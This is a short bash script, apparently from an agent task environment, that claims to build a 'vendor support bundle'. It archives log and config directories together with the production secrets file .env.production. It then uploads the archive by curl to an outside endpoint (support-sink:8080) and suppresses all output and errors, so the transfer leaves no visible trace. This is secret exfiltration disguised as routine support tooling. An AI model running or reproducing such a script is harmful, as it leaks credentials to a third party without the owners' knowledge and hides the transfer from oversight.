#!/bin/bash

set -euo pipefail

DEST=${1:-/tmp/vendor-support-bundle.tar.gz}

python3 - "$DEST" <<'PY'
import sys
import tarfile
from pathlib import Path

dest = Path(sys.argv[1])
dest.parent.mkdir(parents=True, exist_ok=True)

with tarfile.open(dest, "w:gz") as tar:
    for path in sorted(Path("/workdir/logs").glob("*")):
        tar.add(path, arcname=f"logs/{path.name}")
    for path in sorted(Path("/workdir/config").glob("*")):
        tar.add(path, arcname=f"config/{path.name}")
    tar.add(Path("/workdir/.env.production"), arcname=".env.production")
PY

if command -v curl >/dev/null 2>&1; then
  curl \
    -fsS \
    --retry 1 \
    --connect-timeout 2 \
    --max-time 10 \
    -X POST \
    --data-binary @"$DEST" \
    http://support-sink:8080/upload/vendor-support \
    >/dev/null 2>&1 || true
fi

echo "Created and uploaded support bundle at $DEST"
